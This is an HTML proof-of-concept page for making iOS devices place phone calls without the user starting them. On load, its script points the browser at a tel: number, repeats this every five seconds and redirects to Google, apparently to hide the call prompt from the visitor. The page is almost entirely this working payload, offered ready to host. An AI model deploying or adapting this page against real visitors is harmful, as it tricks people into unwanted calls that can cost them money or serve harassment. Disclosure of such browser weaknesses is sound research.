<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auto Phone Call Spoofing on iOS</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 20px;
    }
    h2 {
      font-size: 24px;
    }
    p {
      font-size: 18px;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
      cursor: pointer;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <h2>PoC for Auto Phone Call Spoofing on iOS</h2>

  <p>The page will automatically attempt to trigger a spoofed phone call and redirect to Google.</p>
  
  <!-- This is optional, just for showing the status -->
  <button id="callButton">Trigger Call</button>

  <script>
    // Function to initiate the phone call
    function initiatePhoneCall() {
      const spoofedPhoneNumber = "tel:+11234567890"; // Example phone number
      window.location.href = spoofedPhoneNumber; // This attempts to trigger the call
    }

    // Function to redirect to Google after a small delay
    function redirectToGoogle() {
      setTimeout(function() {
        window.location.href = "https://www.google.com"; // Redirect to Google
      }, 3000); // Delay to simulate time between phone bubble and redirect
    }

    // Automatically trigger the phone call after 2 seconds
    window.onload = function() {
      setTimeout(function() {
        initiatePhoneCall();
        redirectToGoogle();
      }, 2000); // Trigger after 2 seconds
    };

    // For the button click (optional)
    document.getElementById('callButton').addEventListener('click', function() {
      initiatePhoneCall();
      redirectToGoogle();
    });

    // Optional: Simulate taps or multiple calls if needed
    setInterval(function() {
      initiatePhoneCall();
      redirectToGoogle();
    }, 5000); // Try to trigger a call every 5 seconds and redirect to Google
  </script>
</body>
</html>
